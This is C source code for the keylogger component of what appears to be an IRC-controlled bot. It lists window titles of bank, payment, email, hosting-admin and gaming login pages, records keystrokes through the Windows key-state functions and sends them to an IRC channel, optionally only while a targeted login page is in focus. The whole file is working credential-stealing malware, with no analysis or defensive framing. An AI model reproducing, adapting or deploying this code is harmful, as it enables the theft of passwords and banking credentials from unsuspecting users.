#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/externs.h"

#ifndef NO_KEYLOG

SYTES sytes[]={
	"Online Payment, Merchant Account - PayPal", //Paypal
	"Login - PayPal",							 //Paypal
	"e-gold Account Access",                     //E-gold
	"moneybookers.com",                          //Moneybookers
	"AlertPay.com-My Way To Pay",                //AlertPay
	"Login: Step 1",                             //Lib Reserve
	"Welcome to eBay",                           //E-bay
	"RapidShare: Easy Filehosting",              //Rapidshare
	"Bendigo e-banking",						 //Bendigo Bank
	"HSBC Internet Banking",                     //HSBC Bank
	"Bank of America | Home | Personal",         //Bank of America
	"cPanel&reg; 11",                            //Cpanel 11
	"cPanel® 11",								 //Cpanel 11
	"h4cky0u.org • User Control Panel • Login",  //h4cky0u.org
	"Warez-BB.org :: Log in",					 //Warez-bb.org
	"vBulletin Admin Control Panel",             //Vbulletin admin CP
	"DirectAdmin Login",                         //Direct Admin
	"Invision Power Services :: Invision Power Services : Login",
	"IPB: ACP: Log in",							 //IPB Admin login
	"Rapidshare-Premium.com - FREE Rapidshare Premium Link Generator",
	"TorrentFlux",								 //TorrentFlux
    "pornBB :: Log in",                          //A man needs porn...
	"Play.com (UK)",							 //Play.com
	"Citibank Online - Sign On",				 //citibank.com
	"Chase Personal Banking Investments Credit Cards Student Loans Home Auto Commercial Small Business Insurance",
	"Admin Login",                              //shop admin
	"Admin",									//shop admin
	"Shop Admin",								//shop admin
	"Administrator Login",						//shop admin
	"amazon.com",								//Amazon.com
	"Sign in to Yahoo!7 with your Yahoo! ID",	//Yahoo.com
	"Gmail: Email from Google",					//Google.com
	"MessengerFX.com - Web Messenger",          //messengerFX.com MSN online
	"ILoveIM.com Web Messenger",				//ILoveIM.com messanger
	"Web and Mobile messenger everywhere - eBuddy former e-messenger",
	"meebo.com",								//Meebo.com messanger
	"Lloyds TSB -    Logon",                    //lloydstsb.com bank
	"Complete Web Solutions: domains, hosting, site builders and SSL.",    //Godaddy.com
	"Steam Community"				// Steam
};

KEYS keys[]={
	{8,"b","b"},
	{13,"e","e"},
	{27,"[ESC]","[ESC]"},
	{112,"[F1]","[F1]"},
	{113,"[F2]","[F2]"},
	{114,"[F3]","[F3]"},
	{115,"[F4]","[F4]"},
	{116,"[F5]","[F5]"},
	{117,"[F6]","[F6]"},
	{118,"[F7]","[F7]"},
	{119,"[F8]","[F8]"},
	{120,"[F9]","[F9]"},
	{121,"[F10]","[F10]"},
	{122,"[F11]","[F11]"},
	{123,"[F12]","[F12]"},
	{192,"`","~"},
	{49,"1","!"},
	{50,"2","@"},
	{51,"3","#"},
	{52,"4","$"},
	{53,"5","%"},
	{54,"6","^"},
	{55,"7","&"},
	{56,"8","*"},
	{57,"9","("},
	{48,"0",")"},
	{189,"-","_"},
	{187,"=","+"},
	{9,"[TAB]","[TAB]"},
	{81,"q","Q"},
	{87,"w","W"},
	{69,"e","E"},
	{82,"r","R"},
	{84,"t","T"},
	{89,"y","Y"},
	{85,"u","U"},
	{73,"i","I"},
	{79,"o","O"},
	{80,"p","P"},
	{219,"[","{"},
	{221,"","}"},
	{65,"a","A"},
	{83,"s","S"},
	{68,"d","D"},
	{70,"f","F"},
	{71,"g","G"},
	{72,"h","H"},
	{74,"j","J"},
	{75,"k","K"},
	{76,"l","L"},
	{186,";",":"},
	{222,"'","\""},
	{90,"z","Z"},
	{88,"x","X"},
	{67,"c","C"},
	{86,"v","V"},
	{66,"b","B"},
	{78,"n","N"},
	{77,"m","M"},
	{188,",","<"},
	{190,".",">"},
	{191,"/",".?"},
	{220,"\\","|"},
	{17,"[CTRL]","[CTRL]"},
	{91,"[WIN]","[WIN]"},
	{32," "," "},
	{92,"[WIN]","[WIN]"},
	{44,"[PRSC]","[PRSC]"},
	{145,"[SCLK]","[SCLK]"},
	{45,"[INS]","[INS]"},
	{36,"[HOME]","[HOME]"},
	{33,"[PGUP]","[PGUP]"},
	{46,"[DEL]","[DEL]"},
	{35,"[END]","[END]"},
	{34,"[PGDN]","[PGDN]"},
	{37,"[LEFT]","[LEFT]"},
	{38,"[UP]","[UP]"},
	{39,"[RGHT]","[RGHT]"},
	{40,"[DOWN]","[DOWN]"},
	{144,"[NMLK]","[NMLK]"},
	{111,"/","/"},
	{106,"*","*"},
	{109,"-","-"},
	{107,"+","+"},
	{96,"0","0"},
	{97,"1","1"},
	{98,"2","2"},
	{99,"3","3"},
	{100,"4","4"},
	{101,"5","5"},
	{102,"6","6"},
	{103,"7","7"},
	{104,"8","8"},
	{105,"9","9"},
	{110,".","."}
};

int SaveKeys(char *key, char *windowtxt, KEYLOG keylog)
{
	char sendbuf[IRCLINE];
	
	if(keylog.mode)
	{
		for(int i=0;i < sizeof(sytes) / sizeof(SYTES);i++)
		{
			if(strstr(windowtxt, sytes[i].title))
			{
				_snprintf(sendbuf,sizeof(sendbuf),"[KeyLog] %s (%s)", key, sytes[i].title);
				irc_privmsg(keylog.sock,keylog.chan,sendbuf,keylog.notice);
			}
		}
	}else {
		_snprintf(sendbuf,sizeof(sendbuf),"[KeyLog] %s", key);
		irc_privmsg(keylog.sock,keylog.chan,sendbuf,keylog.notice);
	}

	return 0;
}

DWORD WINAPI KeyLoggerThread(LPVOID param)
{
	KEYLOG keylog = *((KEYLOG *)param);
	KEYLOG *keylogs = (KEYLOG *)param;
	keylogs->gotinfo = TRUE;

	char buffer[IRCLINE], buffer2[IRCLINE], windowtxt[61], mwindowtxt[61];
    
	int err = 0, x = 0, i = 0, state, shift, bKstate[256]={0};
    
	HWND active = fGetForegroundWindow(), mactive;
	HWND old = active;
	
	
	fGetWindowText(old,windowtxt,60);

	while (err == 0) {
		Sleep(8);
		
		active = fGetForegroundWindow();
		
		if (active != old) {
			old = active;
			fGetWindowText(old,windowtxt,60);

			if(keylog.mode)
			{
				if((strlen(buffer)) > 0 && (strlen(windowtxt)) < 1)
				{
					sprintf(buffer2, "[KeyLog] .».%s.«.", buffer); 
					err = SaveKeys(buffer2, windowtxt, keylog);
					memset(buffer,0,sizeof(buffer));
					memset(buffer2,0,sizeof(buffer2));
				}
				if((strlen(buffer)) > 0 && (strlen(windowtxt)) > 0)
				{
					sprintf(buffer2, "[KeyLog] .».%s.«.", buffer); 
					err = SaveKeys(buffer2, windowtxt, keylog);
					memset(buffer,0,sizeof(buffer));
					memset(buffer2,0,sizeof(buffer2));
				}
			}
			else if ((strlen(windowtxt)) > 0) {
				sprintf(buffer2, "[KeyLog] .».%s.«. (Changed Windows: %s)", buffer, windowtxt); 
				err = SaveKeys(buffer2, windowtxt, keylog);
				memset(buffer,0,sizeof(buffer));
				memset(buffer2,0,sizeof(buffer2));
			}
		}
		
		// lets make magic...:D Greetingz Rolllin! :D
		if(keylog.mode)
		{
			if((fGetAsyncKeyState(VK_LBUTTON)) == -32767 && (strlen(buffer)) > 0) {
				mactive = fGetForegroundWindow();
				fGetWindowText(mactive,mwindowtxt,60);
				
				sprintf(buffer2, ".».%s.«.", buffer); 
				err = SaveKeys(buffer2, mwindowtxt, keylog);
				memset(buffer,0,sizeof(buffer));
				memset(buffer2,0,sizeof(buffer2));
			}
		}
		
		for (i = 0; i < 92; i++) {
			shift = fGetKeyState(VK_SHIFT);
            
			x = keys[i].inputL;

			if (fGetAsyncKeyState(x) & 0x8000) {
				if (((fGetKeyState(VK_CAPITAL)) && (shift > -1) && (x > 64) && (x < 91)))//caps lock and NOT shift
					bKstate[x] = 1; /* upercase a-z */
				else if (((fGetKeyState(VK_CAPITAL)) && (shift < 0) && (x > 64) && (x < 91)))//caps lock AND shift
					bKstate[x] = 2; /* lowercase a-z */
				else if (shift < 0) /* shift */
					bKstate[x] = 3; /* upercase */
				else bKstate[x] = 4; /* lowercase */
			} else {
				if (bKstate[x] != 0) {
					state = bKstate[x];
					bKstate[x] = 0;
	
					if (x == 8) {
						buffer[strlen(buffer)-1] = 0;
						continue;
					
					} else if (strlen(buffer) > 511 - 70) {
						active = fGetForegroundWindow();
						fGetWindowText(active,windowtxt,60);
						if(keylog.mode)
							sprintf(buffer2,"[KeyLog] .».%s.«. (Buffer full)",buffer);
						else
							sprintf(buffer2,"[KeyLog] .».%s.«. (Buffer full) (%s)",buffer,windowtxt);
						err = SaveKeys(buffer2, windowtxt, keylog);
						memset(buffer,0,sizeof(buffer));
						memset(buffer2,0,sizeof(buffer2));

						continue;
					
					} else if (x == 13) {
						if (strlen(buffer) == 0) 
							continue;
						
						active = fGetForegroundWindow();
						fGetWindowText(active,windowtxt,60);
						if(keylog.mode)
							sprintf(buffer2,"[KeyLog] .».%s.«. (Return)",buffer);
						else
							sprintf(buffer2,"[KeyLog] .».%s.«. (Return) (%s)",buffer,windowtxt);
						err = SaveKeys(buffer2, windowtxt, keylog);
						memset(buffer,0,sizeof(buffer));
						memset(buffer2,0,sizeof(buffer2));

						continue;
					} else if (state == 1 || state == 3)
						strcat(buffer,keys[i].outputH);
					else if (state == 2 || state == 4) 
						strcat(buffer,keys[i].outputL);
				}
			}
		}
	}
	clearthread(keylog.threadnum);

	ExitThread(0);
}
#endif